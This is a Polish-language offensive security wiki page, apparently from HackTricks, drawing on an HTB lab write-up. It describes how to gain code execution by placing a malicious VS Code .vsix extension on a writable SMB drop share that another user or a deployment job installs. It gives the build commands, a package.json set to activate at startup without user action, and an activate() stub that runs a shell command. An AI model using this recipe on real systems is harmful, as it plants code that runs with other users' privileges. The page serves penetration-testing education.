# VS Code Extension Drop-Share Execution

{{#include ../banners/hacktricks-training.md}}

Rozszerzenia VS Code i Visual Studio VSSDK używają pakietów `.vsix`, ale mają różne manifesty i środowiska uruchomieniowe. Zapisywalny udział SMB typu drop share staje się ścieżką wykonania **tylko wtedy, gdy** inny użytkownik lub zadanie wdrożeniowe zainstaluje jego pakiety w VS Code. Funkcja `activate()` rozszerzenia uruchamia się wtedy w extension host z uprawnieniami tego użytkownika. Samo zapisanie pliku `.vsix` w udziale nie powoduje jego wykonania.<sup>[[1]](#references)[[2]](#references)</sup>

## Przebieg pakowania i aktywacji

Najpierw sprawdź wersję VS Code używaną przez odbiorcę oraz to, czy udział jest faktycznie synchronizowany lub instalowany. Wygeneruj rozszerzenie TypeScript i umieść zamierzoną akcję Node.js w funkcji `activate()`. Użyj zdarzenia aktywacji, które uruchamia się bez polecenia wybranego przez użytkownika, takiego jak `onStartupFinished`, a następnie skompiluj i spakuj rozszerzenie. `engines.vscode` to **bramka zgodności środowiska uruchomieniowego**; dopasowanie `@types/vscode` do wersji docelowego API jest środkiem zapewniającym zgodność podczas kompilacji, a nie wymaganiem dotyczącym instalacji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Dla edytora uruchamiającego VS Code 1.118 odpowiednie pola `package.json` to:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

Minimalny test `activate()` może wykonać polecenie i zapisać jego wynik w logu z poziomu hosta rozszerzeń. Zastąp akcję testową dopiero po sprawdzeniu, że pakiet został aktywowany na oczekiwanym koncie/w oczekiwanej sesji. Zdarzenie `onStartupFinished` występuje po uruchomieniu, więc nie świadczy o wykonaniu, dopóki edytor faktycznie się nie uruchomi, a rozszerzenie nie zostanie zainstalowane i włączone.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

Atakujący z dostępem do zapisu do udziału drop może przesłać przetestowany pakiet i poczekać na zadanie, które go wykorzysta. W przykładzie Checkpoint dostęp do udziału przywróconego konta umożliwiał zapis; konto o niskich uprawnieniach, używane na początku, mogło jedynie odczytywać zawartość udziału. Nie należy mylić tych dwóch warunków wstępnych. W przypadku rozszerzeń **Visual Studio** skorzystaj z osobnego rozdziału [Nadużycia rozszerzeń Visual Studio VSIX](visual-studio-vsix-extension-abuse.md), a nie z procedury dotyczącej VS Code.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Zdarzenia aktywacji](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Publikowanie rozszerzeń](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
